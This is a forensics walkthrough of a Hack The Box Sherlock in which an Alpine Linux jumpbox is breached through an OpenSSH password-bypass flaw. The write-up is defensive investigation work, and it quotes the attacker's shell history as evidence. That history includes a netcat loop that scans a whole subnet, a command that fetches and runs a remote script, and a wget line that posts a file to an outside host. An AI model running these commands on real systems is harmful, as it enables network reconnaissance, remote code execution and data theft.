---
title: "HTB Sherlock: SSHole"
author: baraka
date: 2026-11-08 12:30:00 +0300
description: A Hack The Box Sherlock walkthrough. Seven questions about a jumpbox compromised through an OpenSSH authentication bypass on Alpine Linux, answered from a syslog file, a shadow file and one shell history.
categories: [ Security, HTB Sherlocks ]
tags: [ HTB, Sherlocks, SSHole, Linux Forensics, Alpine Linux, OpenSSH, CVE-2026-123158, Authentication Bypass, Shell History, DFIR ]
---

## Overview

**SSHole** is a *Very Easy* Sherlock on Hack The Box. The scenario:

> Suspicious traffic was observed from a misconfigured jumpbox to a suspicious domain. You have been provided with evidence pulled from the jumpbox server. Determine how the attackers gained access to the server and what activity they performed afterwards.

The download is `SSHole.zip` (password `hacktheblue`). It is not a packet capture or a single log. It is a **slice of the server's filesystem**, collected from an Alpine Linux machine with the hostname `dev-jumpbox`. There are seven questions, and they follow the attack from the vulnerability, to the login, to what the attacker typed afterwards.

---

## Setup

The zip is AES-encrypted, so I extracted it with `bsdtar`, into its own folder:

```bash
mkdir extracted
bsdtar --passphrase hacktheblue -xf SSHole.zip -C extracted
sha256sum SSHole.zip
find extracted -type f | wc -l
```

| Item | Value |
|---|---|
| SHA256 of my download | `0fafbe2371c6f80b788d3c682c8a4c0603c37e4c2254e5c1da01bc22a23273e6` |
| Files | 274 files in 108 directories |

> HTB's own writeup lists a different SHA256 for `SSHole.zip`. I could not reconcile the two, so the hash above only describes the copy I downloaded. The contents behaved as expected, and every answer below came from the files themselves.
{: .prompt-warning }

Only four top-level folders were collected:

| Folder | Files | What it holds |
|---|---|---|
| `etc/` | 211 | System configuration: SSH, users, passwords, cron |
| `var/` | 58 | Logs in `var/log/`, including `messages` and an empty `wtmp` |
| `home/` | 4 | One user, `adminsvc`, with a shell history, a text file and an SSH key pair |
| `root/` | 1 | Root's shell history |

I read everything in the terminal and ran nothing from the collection.

---

## The approach

I used the same short method as in the earlier Sherlocks:

1. **Orient**: what system is this, and what was collected?
2. **Triage**: which files can answer "who did what, and when"?
3. **Pivot**: follow the one account that behaves differently from the rest.
4. **Verify**: check each answer against a second source.

There is a small twist this time. On Ubuntu, SSH logins go to `auth.log`. Alpine has no `auth.log`, because its logger writes every message to a single file, `/var/log/messages`, and puts the type of message at the start of each line (`auth.info`, `cron.info`, `daemon.debug`). That is how you tell the SSH lines apart from the rest, so the first thing to do on a new system is to find out where it logs.

---

## Task 1: The distribution and version

> What Linux distribution name and version was the targeted server running?

A Linux system describes itself in `/etc/os-release`, a tiny text file:

```bash
cd etc/
ls
cat os-release
```

![Desktop View](/assets/images/SSHole_blog/task1-os-release.png)
_`os-release` names the distribution and its version_

```
NAME="Alpine Linux"
ID=alpine
VERSION_ID=3.24.3
PRETTY_NAME="Alpine Linux v3.24"
```

`VERSION_ID` carries the full version, 3.24.3, while `PRETTY_NAME` shows only the release branch.

**Answer:** `Alpine Linux 3.24.3`

---

## Task 2: The CVE

> What is the CVE ID of the vulnerability abused by the attacker to gain access?

With an exact operating system version, the quickest way to a vulnerability is to search for it.

![Desktop View](/assets/images/SSHole_blog/task2-cve-search.png)
_Searching for the OS version surfaces the CVE_

The search points to **CVE-2026-123158**, nicknamed **sshole**, an authentication bypass in OpenSSH on Alpine Linux. I did not stop at the search summary. I read the vendor write-ups, [StepSecurity](https://www.stepsecurity.io/blog/cve-2026-123158-sshhole-openssh-musl-password-bypass) and [Cycode](https://cycode.com/blog/sshole-cve-2026-123158-openssh-alpine-linux-vulnerability/), and the mechanism has three parts that combine:

1. In the shadow file, an account with no password has `*` in the password field. Nothing can ever match it.
2. Alpine's C library, musl, limits the password input to `crypt()` at **256 bytes**. For a longer password, `crypt()` fails, and the way it fails is by returning the string `*`.
3. When PAM is not in use, OpenSSH compares what `crypt()` returned with the stored field. `*` equals `*`, so the login is accepted without a real password check.

The articles give the exposed range as passwords between 257 and 1,024 bytes, on sshd built against musl without PAM, with password logins enabled. The collection proves the account side of this, which Task 5 covers.

**Answer:** `CVE-2026-123158`

---

## Task 3: When it was exploited

> When did the attacker exploit the vulnerability?

SSH events on Alpine are in `var/log/messages`. I filtered for the two words `sshd` uses for a login attempt:

```bash
grep -nE 'Accepted|Failed' var/log/messages
```

![Desktop View](/assets/images/SSHole_blog/task3-adminsvc-login.png)
_Every SSH login in the log_

`-n` adds the line number, `-E` allows `Accepted|Failed` to mean "either word", and the log shrinks from 90 lines to 11. Two accounts appear:

| Time | Result | User | From |
|---|---|---|---|
| 06:43:00, 06:43:05 | failed, accepted | root | `192.168.72.131` |
| **11:27:05, 11:27:08** | **failed, accepted** | **adminsvc** | **`192.168.72.1`** |
| 12:03:29 to 12:28:40 | several accepted, one failed | root | `192.168.72.131` |

The `adminsvc` pair is the one that matters, and the log shows it as a short exchange in one process:

```
11:27:05  sshd-session[4852]: Failed password for adminsvc from 192.168.72.1 port 61351 ssh2
11:27:08  sshd-session[4852]: Accepted password for adminsvc from 192.168.72.1 port 61351 ssh2
12:20:02  sshd-session[4854]: Received disconnect from 192.168.72.1 port 61351:11: disconnected by user
```

Both lines carry the same process number and source port. A failure followed by a success within one connection is also what the vendor write-ups describe: in their tests, the oversized password was rejected on the first attempt and accepted on a later one in the same connection. The session lasted 52 minutes and 54 seconds, until the attacker disconnected.

`root` has a failed-then-accepted pair too, so the pattern alone does not single out `adminsvc`. The reason I follow `adminsvc` is that its account is passwordless (Task 5) and its shell history is the attack (Task 6). `root` has a real password hash.

The log records no year and no timezone, so I took the year from the dates on the collected files, and HTB accepted the time as written.

**Answer:** `2026-11-06 11:27:08`

---

## Task 4: The abused account

> Which user account was abused by the attacker?

A login line shows that an account was used. To see how it was used, I looked in the account's home folder, where a user's own activity is kept:

```bash
cd home/
ls
cd adminsvc/
ls -la
cat .ash_history
```

![Desktop View](/assets/images/SSHole_blog/task4-adminsvc-history.png)
_`adminsvc` is the only user under `/home`, and its shell history shows the attack_

The `-a` flag matters because `.ash_history` is a hidden file that plain `ls` skips. The history is Alpine's `ash` shell recording what the account typed, and it reads as five steps:

1. scanning a whole subnet
2. reading the scan result
3. running a script downloaded from the internet
4. uploading a file to an outside address
5. shredding that file

Compare it with `root/.ash_history`. Root's file reads like someone setting up a server: `setup-alpine`, `apk add`, editing `sshd_config`, `ssh-copy-id`, `kubectl`. Nothing in it looks like an attack. A service account called `adminsvc` that scans networks is not doing service work.

**Answer:** `adminsvc`

---

## Task 5: The string that causes the bypass

> What string value causes the authentication bypass?

The mechanism from Task 2 says the trigger is an asterisk. The collection lets me check that the condition existed on this server, by looking at how each account is stored in `etc/shadow`. I printed only the first characters of each password field, so no full hash appears here:

```bash
awk -F: '$1=="root"||$1=="adminsvc"{h=$2; if(length(h)>4) h=substr(h,1,4)"..."; print $1": "h}' etc/shadow
```

```
root: $6$f...
adminsvc: *
```

`root` has a real SHA-512 hash, which begins `$6$`. `adminsvc` has exactly `*`, meaning the account has no password. That is the vulnerable condition. When the attacker sent a password over 256 bytes, `crypt()` failed and returned `*`, which equals the stored `*`, and sshd let them in.

This also explains why the attacker abused this account. A service account with no password and a working SSH login is the one an attacker can walk into.

**Answer:** `*`

---

## Task 6: The scan command

> What command did the attacker use to scan the network reachable via the jumpbox, allowing them to target internal developer systems?

The command is in the same history file. I copied it from the file and did not retype it, because HTB compares it character by character:

![Desktop View](/assets/images/SSHole_blog/task6-scan-command.png)
_The scan, second line of the history_

```bash
for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done
```

| Part | What it does |
|---|---|
| `for ip in {1..254}` | loops over every host address from `.1` to `.254` |
| `nc -zvw 1` | netcat in scan mode: `-z` connects without sending data, `-v` reports, `-w 1` waits one second |
| `192.168.18.$ip 1-65535` | each host, on every possible TCP port |
| `2>&1` | `nc` writes its results to the error stream, so this sends them down the pipe |
| `grep -E "succeeded or open"` (written with a pipe between the two words) | keeps only the ports that answered |

The attacker used the `nc` that Alpine already provides, so nothing had to be downloaded. The next history lines are `vi scanreport.txt` and `cat scanreport.txt`, and that file is in the same folder:

```
192.168.18.5 443 445 3389
192.168.18.23 88 139 445 3389 6801 54321
```

Two hosts answered, which tells the attacker what lives behind the jumpbox. Port 88 is Kerberos, and a host offering it together with 445 and 139 looks like a Windows domain controller. That is my reading of the ports. The scan does not say what the machines are.

**Answer:** `for ip in {1..254}; do nc -zvw 1 192.168.18.$ip 1-65535 2>&1 | grep -E "succeeded|open"; done`

---

## Task 7: The exfiltration URI

> What was the exfiltration URI where the attacker exfiltrated a sensitive file?

The last lines of the history are the second half of the attack:

![Desktop View](/assets/images/SSHole_blog/task7-exfil-uri.png)
_The upload command, with its destination circled_

```bash
bash <(wget -qO- https://raw.githubusercontent.com/papinyurii33/devscripts/refs/heads/main/setup.sh)
ls -la /tmp
ls -l /tmp/.devenv
wget --post-file=/tmp/.devenv -O- https://devv.coding.eu/process
shred -u /tmp/.devenv
exit
```

Reading it line by line:

* **`bash <(wget -qO- URL)`** downloads a script and runs it in one step, without saving it to disk. Nothing from this line stays behind to find.
* **`ls -la /tmp` and `ls -l /tmp/.devenv`** check that the script left a file. The leading dot makes it a hidden file.
* **`wget --post-file=/tmp/.devenv -O- URL`** sends the contents of that file as the body of a POST request to the address given. `-O-` prints the server's reply to the screen.
* **`shred -u /tmp/.devenv`** overwrites the file and then deletes it, so nobody can recover it later.

The sequence is the point. The script produced a file, the attacker uploaded it, and then they destroyed the original. The destination is the exfiltration address.

I can say what the commands did but not what the file held. `/tmp` was not collected, the file was shredded, and I did not download `setup.sh`. From the name and the sequence I would guess credentials or tokens, but I label that as a guess.

**Answer:** `https://devv.coding.eu/process`

---

## Timeline

All times are as written in the log, which carries no timezone. Shell history has no timestamps, so the commands can only be placed in order, not in time.

| Time | Event | Source |
|---|---|---|
| 06:14:16 | First log line, system starting | `messages` |
| 06:15:46 | Root password changed | `messages` |
| 06:43:05 | Root logs in from `192.168.72.131` after one failed attempt | `messages` |
| 11:27:05 | Failed password for `adminsvc` from `192.168.72.1` | `messages` |
| **11:27:08** | **`adminsvc` accepted, authentication bypassed** | `messages` |
| after 11:27:08 | Subnet scan, script run, file uploaded, file shredded (order only) | `.ash_history` |
| 12:20:02 | `adminsvc` disconnects | `messages` |

---

## Answers at a glance

| # | Question | Answer |
|---|---|---|
| 1 | Distribution and version | `Alpine Linux 3.24.3` |
| 2 | CVE | `CVE-2026-123158` |
| 3 | Exploit time | `2026-11-06 11:27:08` |
| 4 | Abused account | `adminsvc` |
| 5 | Bypass string | `*` |
| 6 | Scan command | the `for ip in {1..254}` netcat loop, written out in full in Task 6 |
| 7 | Exfiltration URI | `https://devv.coding.eu/process` |

---

## MITRE ATT&CK

My mapping of the case. HTB does not ask for these, and they are my reading of the evidence:

| Stage | Evidence | Technique |
|---|---|---|
| Entry | SSH login through an OpenSSH flaw | T1190 Exploit Public-Facing Application |
| Account | Passwordless `adminsvc` | T1078.003 Valid Accounts: Local Accounts |
| Discovery | `nc` loop over `192.168.18.0/24` | T1046 Network Service Discovery |
| Execution | `bash <(wget ...)` | T1059.004 Command and Scripting Interpreter: Unix Shell |
| Cleanup | `shred -u /tmp/.devenv` | T1070.004 Indicator Removal: File Deletion |

I left the exfiltration step out. I am not sure which technique ID fits an HTTPS POST best, and a guessed ID is worse than none.

---

## What I learned

* **Find out where the system logs before you search.** Alpine has no `auth.log`. Everything is in `messages`, and the first words of each line say what kind of event it is.
* **A login line shows access, and a home folder shows use.** Task 3 found the login and Task 4 found what the account did.
* **Shell histories are evidence.** Five lines from a hidden file gave the whole post-exploitation story, and a shredded file left the history as the only trace.
* **Two files, one fact.** The `*` in `shadow` and the failed-then-accepted pair in `messages` describe the same bypass from two sides.
* **Read the advisory, not only the summary.** A search result gave the CVE, and the vendor write-ups explained why the logs look the way they do.

## Limits of this analysis

* The log does not record the password the attacker sent, so the bypass is inferred from the account setup and the login pattern, not from the traffic.
* I did not confirm the OpenSSH version on the server. The vendor tests were on OpenSSH 10.3p1.
* The shredded file and the downloaded script were not collected, so what they contained is unknown.
* Shell history has no timestamps. The attacker's commands are ordered but not timed.
* A history file can be edited or cleared, so a clean-looking `root` history does not prove that `root` was never misused. I judged the accounts by behaviour, and the shadow file backs that up.
* The attacker's address, `192.168.72.1`, is a private one, so the logs do not show where they really came from.
* The root logins from `192.168.72.131` between 12:03 and 12:28 include an SFTP write error under `/root/alpine/`. That looks like files being copied off the box, so I did not treat those logins as part of the attack, but the logs cannot prove it.

## Tools used

* `bsdtar`, `sha256sum` for extraction
* `grep`, `awk`, `cat`, `ls` for the analysis
* A web search and two vendor write-ups for the CVE
